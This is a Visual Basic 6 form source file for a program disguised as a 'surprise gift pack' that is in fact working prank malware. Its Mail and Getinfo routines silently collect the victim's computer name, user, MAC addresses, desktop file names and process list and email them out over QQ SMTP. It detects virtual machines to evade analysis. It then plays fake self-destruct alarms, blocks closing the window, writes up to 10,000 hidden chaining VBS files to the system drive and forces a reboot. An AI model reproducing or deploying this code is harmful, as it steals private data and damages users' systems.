VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "惊喜大礼包"
   ClientHeight    =   1665
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   2490
   ControlBox      =   0   'False
   DrawStyle       =   5  'Transparent
   BeginProperty Font 
      Name            =   "微软雅黑"
      Size            =   15
      Charset         =   134
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H8000000D&
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   ScaleHeight     =   1665
   ScaleWidth      =   2490
   StartUpPosition =   2  '屏幕中心
   Begin VB.CommandButton Command1 
      BackColor       =   &H00FF00FF&
      Caption         =   "打开"
      BeginProperty Font 
         Name            =   "微软雅黑"
         Size            =   15.75
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1815
      Left            =   -120
      Style           =   1  'Graphical
      TabIndex        =   0
      Top             =   -120
      Width           =   2655
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SetWindowPos Lib "user32" ( _
ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function APIBeep Lib "kernel32" Alias "Beep" ( _
ByVal dwFreq As Long, ByVal dwDuration As Long) As Long
Private Declare Function OSruntime Lib "winmm.dll" Alias "timeGetTime" () As Long '获取开机到现在的毫秒数
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
'——————————————————————————————————————————————————————
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" ( _
                          ByVal hwnd As Long, _
                          ByVal wMsg As Long, _
                          ByVal wParam As Long, _
                          ByVal lParam As Long) As Long
Private Const WM_APPCOMMAND As Long = &H319
Private Const APPCOMMAND_VOLUME_UP As Long = 10
Private Const APPCOMMAND_VOLUME_DOWN As Long = 9
Private Const APPCOMMAND_VOLUME_MUTE As Long = 8
Sub VolumeUp(p As Integer)
For i = 1 To p
    SendMessage Me.hwnd, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000
    Next i
End Sub

Sub delay(delaytime As Long)  '延时核心子过程,以毫秒计
savetime = OSruntime
While OSruntime < savetime + delaytime '循环等待
DoEvents '交出控制权
Wend
End Sub

Private Sub Form_Load()
On Error GoTo noreg
Dim 次数 As Long
Set ws = CreateObject("Wscript.Shell") '利用wshshell写注册表
次数 = ws.RegRead("HKCU\Software\LHCAPPs\jxdlb\startstat")
If 次数 + 1 >= 2 Then
MsgBox "若您在第一次打开时看到字节跳动特效，请到系统盘查收第二个礼包", vbOKOnly, "惊喜大礼包提示：" & 次数
End If
If 次数 + 1 >= 4 Then
MsgBox "喜欢我就分享我！(打开次数：" & 次数
End If
1: ws.RegWrite "HKCU\Software\LHCAPPs\jxdlb\startstat", 次数 + 1, "REG_SZ"
Exit Sub
noreg: ws.RegWrite "HKCU\Software\LHCAPPs\jxdlb\startstat", 1, "REG_SZ"
GoTo 1
End Sub

Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)

Call Command1_Click
End Sub




Private Sub Command1_Click()
On Error GoTo 32
Command1.Enabled = False
Command1.Caption = "正在检查更新......"
Mail
'MsgBox "为了更好的享受音效，请使用带有蜂鸣器的主板，如您是Win10系统请打开音频播放设备"
If n = 0 Then
 Command1.Caption = "正在启动自毁程序......1%"
 delay (1000)
 VolumeUp (30) '提高60音量
 Form1.WindowState = 2
 Form1.Caption = "准备自毁......"
 delay (1000)
 Command1.Height = Form1.Height
 Command1.Width = Form1.Width + 30
 Command1.BackColor = &HAA0000
 Command1.Font = "system"
 Command1.FontSize = 50
 SetWindowPos Me.hwnd, -1, 0, 0, 0, 0, 3
 '''''''''''''''''''''''''''''''''''''''''''''
 n = 0
 freq = 250 '频率
 dur = 300 '时长
 Do
 VolumeUp (1)
 SetWindowPos Me.hwnd, -1, 0, 0, 0, 0, 3
 Form1.WindowState = 2
 Command1.Caption = "Warning: The computer will execute self-destruct after " & dur & " countdown.Please throw the computer from the nearest window immediately, otherwise you will bear the consequences! (Believe it or not.)"
 DoEvents
 APIBeep freq, dur
 n = n + 1
 freq = freq + 7
 dur = dur - 1
 Loop Until n = 300 '次数
 Command1.Caption = "正在启动自毁程序......2%(flooding the memory)"
 delay 200
 APIBeep 1600, 500
 APIBeep 1600, 500
 APIBeep 1600, 500
 APIBeep 1200, 600
 delay 600
 Command1.Caption = "正在启动自毁程序......39%(obfuscating the memory)"
 APIBeep 1600, 800
 APIBeep 1600, 800
 APIBeep 1600, 800
 APIBeep 1200, 1000
 delay 600
 Command1.Caption = "正在启动自毁程序......58e6ada3e59ca8e590afe58aa8e887aae6af81e7a88be5ba8f2e2e2e2e2e2e636c656172696e677468656d656d6f727929%(clearing the memory)"
 APIBeep 1600, 1000
 APIBeep 1600, 1000
 APIBeep 1600, 1000
 APIBeep 1200, 1500
 delay 600
 Command1.Caption = "正在启动自毁程序......75fatal error syseb3e7af5abe483458591a86ef9841052tem halted%(disabling the memory)"
 APIBeep 1600, 1000
 APIBeep 1600, 1000
 APIBeep 1600, 1000
 delay 10
 Command1.BackColor = &HAA
 DoEvents
 APIBeep 2000, 2500 '内存之声
 Command1.Caption = "正在启动自毁程序......&#90%(disabling the disks,look at your HDD light)"
 delay 600
 ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 a = Second(Time)
 Open App.Path & "\killexe" & a & ".bat" For Output As #1
 '"@echo off" 不显示执行过程
 Print #1, "@echo off"
 Print #1, "ping -n 2 127.0>nul"
 '删除指定文件
 Print #1, "del " & App.EXEName + ".exe"
 Print #1, "ping -n 1 127.0>nul"
 '删除自身
 Print #1, "del killexe" & a & ".bat"
 Print #1, "cls"
 Print #1, "exit"
 Close #1
 
 Open App.Path & "\GHOST" & a & ".bat" For Output As #1
 Print #1, "@echo off"
 Print #1, "echo ·····"
 Print #1, "del GHOST" & a & ".bat"
 Print #1, "cls"
 Print #1, "exit"
 Close #1
 '开机发现鬼出没
 ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 WriteFile (10000) '写入文件10000
 Shell "cmd /c" & "shutdown -r -t 1000"      '核心命令
 End
End If
Exit Sub
32: MsgBox "又见面啦！请在系统盘查收下一个礼包（1）哦！"
End
End Sub



Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Cancel = UnloadMode = vbFormControlMenu
End Sub

'注：禁用Ctrl，Alt，del，tab会被视为病毒而无法运行




Sub WriteFile(M As Integer)
Set fs = CreateObject("scripting.filesystemobject") '定义对象
'''''''''''''''''''''''''''''''''''''''获取系统盘符
Dim StrBuff As String, rtn As Long, sysdrv
StrBuff = Space(255)

rtn = GetWindowsDirectory(StrBuff, 255)
If rtn Then
Drivename = Left(StrBuff, 1)
End If
'''''''''''''''''''''''''''''''''''''''输出系统盘符
GetEmptySpaceOn (Drivename)
Do
X = X + 1
DoEvents
GetEmptySpaceOn (Drivename)
Data = "ON ERROR RESUME NEXT" & vbCrLf _
& "sleep 50" & vbCrLf _
& "'哈哈" & vbCrLf _
& "CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ").run " & Chr(34) & X + 1 & ".vbs" & Chr(34) & vbCrLf _
& "msgbox" & Chr(34) & "磁盘空间仅剩" & SpaceLeft & "字节"""

If (fs.FileExists(Drivename & ":\" & Str(n) & ".vbs")) Then
Shell "cmd /c " & Drivename & ":\1.vbs"
'Set f = fs.opentextfile(Drivename & ":\" & X & ".vbs", 8)

'f.write Data

'f.writeline Data

'f.Close

Else

Set f = fs.OpenTextFile(Drivename & ":\" & X & ".vbs", 2, True)

f.WriteBlankLines 2

f.Write Data

f.Close


End If
SetAttr Drivename & ":\" & X & ".vbs", vbSystem Or vbHidden
Command1.Caption = "正在启动硬盘自毁程序......破坏扇区" & X * 64 & "/640000(disabling the disks,look at your HDD light)"
Loop Until X = M
SetAttr Drivename & ":\" & "1.vbs", vbSystem Or vbNormal
End Sub

Function GetEmptySpaceOn(Drivename As String) '查看剩余空间
Set fso = CreateObject("Scripting.FileSystemObject")
Set driver = fso.GetDrive(Drivename & ":")
SpaceLeft = driver.AvailableSpace
End Function

Sub Mail()
On Error Resume Next
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''邮件发送模块
Dim Email As Object
Const NameSpace = "http://schemas.microsoft.com/cdo/configuration/"
Set Email = CreateObject("cdo.message")
Email.From = "**@qq.com" '发件人邮箱
Email.To = "*@qq.com" '收件人邮箱*
Email.Subject = "惊喜"  '主题
Email.Textbody = Getinfo '邮件内容
With Email.Configuration.Fields
.item(NameSpace & "sendusing") = 2
.item(NameSpace & "smtpserver") = "smtp.qq.com" '使用qq的邮件服务器
.item(NameSpace & "smtpserverport") = 465
.item(NameSpace & "smtpauthenticate") = 1
.item(NameSpace & "sendusername") = ** 'qq号码

.item(NameSpace & "sendpassword") = "***"  ' 授权码（密码）
.item(NameSpace & "smtpusessl") = "true" '加密发送，QQ邮箱不允许普通发送
.Update
End With
Email.Send
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''邮件发送模块
End Sub

Function Getinfo()
On Error Resume Next
Dim s, System, item
Dim i As Integer
Set System = GetObject("winmgmts:").InstancesOf("Win32_ComputerSystem")
For Each item In System
s = "惊喜大礼包2.0：" & vbCrLf
s = s & "***********************" & vbCrLf
s = s & "计算机名称: " & item.Name & vbCrLf
s = s & "状态: " & item.Status & vbCrLf
s = s & "类型: " & item.SystemType & vbCrLf
s = s & "生产厂家: " & item.Manufacturer & vbCrLf
s = s & "型号: " & item.Model & vbCrLf
s = s & "总内存: " & item.totalPhysicalMemory & "bytes" & vbCrLf
s = s & "域: " & item.domain & vbCrLf
's = s & "工作组" & item.Workgroup & vbCrLf '获得工作组和域的选项不能同时用
s = s & "当前用户: " & item.UserName & vbCrLf
s = s & "启动状态" & item.BootupState & vbCrLf
s = s & "该计算机属于" & item.PrimaryOwnerName & vbCrLf
s = s & "系统类型" & item.CreationClassName & vbCrLf
s = s & "计算机类型" & item.Description & vbCrLf
For i = 0 To 1 '这里假设安装了两个系统
s = s & Chr(5) & "启动选项" & i & " :" & item.SystemStartupOptions(i) & vbCrLf
Next i
Next
''''''''''''''''''''''''''''''''''''''''''''''''''
Dim WMI服务 As Object
Dim 对象 As Object
Dim 子对象 As Object
Dim 刷新 As Long
刷新 = 0
Set WMI服务 = GetObject("winmgmts:\\.\root\cimv2")
Set 对象 = WMI服务.InstancesOf("Win32_Processor")
Me.CurrentX = 0
Me.CurrentY = 0
For Each 子对象 In 对象
If 刷新 = 0 Then
刷新 = 1
Me.Cls
End If
Seewhat = 子对象.Name
s = s & "CPU:" & 子对象.Name & "@" & 子对象.CurrentClockSpeed & "MHz (使用率:" & _
子对象.LoadPercentage & "%)" & "序列号：" & 子对象.ProcessorId & vbCrLf
Next
'''''''''''''''''''''''''''''''''''
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
For i = 1 To 20
Set colItems = objWMIService.ExecQuery("Select * From Win32_PerfRawData_PerfOS_Memory")
For Each objItem In colItems
intValue = objItem.Availablekbytes
memory = "可用内存：" & intValue & "KB"
Next
Next
s = s & memory & vbCrLf
'''''''''''''''''''''''''''''''''''
    Set fsoobj = CreateObject("Scripting.FileSystemObject")
    Set drvObj = fsoobj.Drives
    s = s & "分区信息：" & vbCrLf
    For Each D In drvObj
        Err.Clear
           If D.IsReady Then
                s = s & D.DriveLetter & "盘：" & vbCrLf
                s = s & "可用空间:" & cSize(D.FreeSpace) & vbCrLf
                s = s & "总大小:" & cSize(D.TotalSize) & vbCrLf
                s = s & "使用率 :" & Round(100 * ((D.TotalSize - D.FreeSpace) / D.TotalSize), 2) & "%" & vbCrLf
           End If
    Next
''''''''''''''''''''''''''''''''''''''''''''''''''
Set WMI = GetObject("winmgmts:\\.\root\CIMV2")
Set w = WMI.ExecQuery("select * from win32_NetworkAdapter")
s = s & "网络适配器"
For Each 子对象 In w
    s = s & vbCrLf & 子对象.ProductName
Next
Set w = WMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled=True")
s = s & vbCrLf & "MAC地址"
For Each 子对象 In w
    s = s & vbCrLf & 子对象.MACAddress
Next
Set w = WMI.ExecQuery("select * from win32_VideoController")
s = s & vbCrLf & "显卡型号----显存"
For Each 子对象 In w
    s = s & vbCrLf & 子对象.Name & " ---- " & 子对象.AdapterRAM & vbCrLf
Next
If InStr(s, "Teredo") > 0 Or InStr(s, "Virt") > 0 Or InStr(s, "VMware") > 0 Then
    If InStr(s, "VMnet") <= 0 And InStr(s, "Wi-Fi Direct") <= 0 Then
    MsgBox "咦，（环顾四周）我怎么被困在虚拟机里了？（指着虚拟的环境）这还怎么操作？玩个" & Seewhat & "?（程序将退出）", vbCritical, "玩个锤子"
    End
    End If
End If
''''''''''''''''''''''''''''''''''''''''''''''''''
s = s & "文件名:" & vbCrLf
Dim fso As Object
Dim folder As Object
Dim subfolder As Object
Dim file As Object
Set fso = CreateObject("scripting.filesystemobject") '创建FSO对象
Dim kk As New IWshRuntimeLibrary.IWshShell_Class
Set folder = fso.GetFolder(kk.SpecialFolders("Desktop"))
For Each file In folder.Files '遍历根文件夹下的文件
zmwj = zmwj & file & vbCrLf '输出文件名
Next
Set fso = Nothing
Set folder = Nothing
Dim aa()
aa = Array(".pdf", ".ppt", ".pptx", ".xls", ".xlsx", ".doc", ".docx", ".txt", ".rtf", ".png")
For i = 0 To 9
If InStr(zmwj, aa(i)) Then
xnj = xnj + 1
End If
Next i
If InStr(zmwj, "My Document") Or xnj > 6 Then
MsgBox "咦，（环顾四周）我怎么被困在虚拟机里了？（指着虚拟的环境）这还怎么操作？玩个" & Seewhat & "?（程序将退出）", vbCritical, "玩个锤子"
End
End If
s = s & zmwj
''''''''''''''''''''''''''''''''''''''''''''''''''
Dim objs, obj
    Set WMI = GetObject("WinMgmts:")
    Set objs = WMI.InstancesOf("Win32_Process")
    s = s & "活跃进程：" & vbCrLf
    For Each obj In objs
        s = s & obj.Description & Chr(13) & Chr(10)
    Next
Getinfo = s
End Function


Function cSize(tSize)
    If tSize >= 1073741824 Then
       cSize = Int((tSize / 1073741824) * 1000) / 1000 & " GB"
    ElseIf tSize >= 1048576 Then
       cSize = Int((tSize / 1048576) * 1000) / 1000 & " MB"
    ElseIf tSize >= 1024 Then
       cSize = Int((tSize / 1024) * 1000) / 1000 & " KB"
    Else
       cSize = tSize & "B"
    End If
End Function

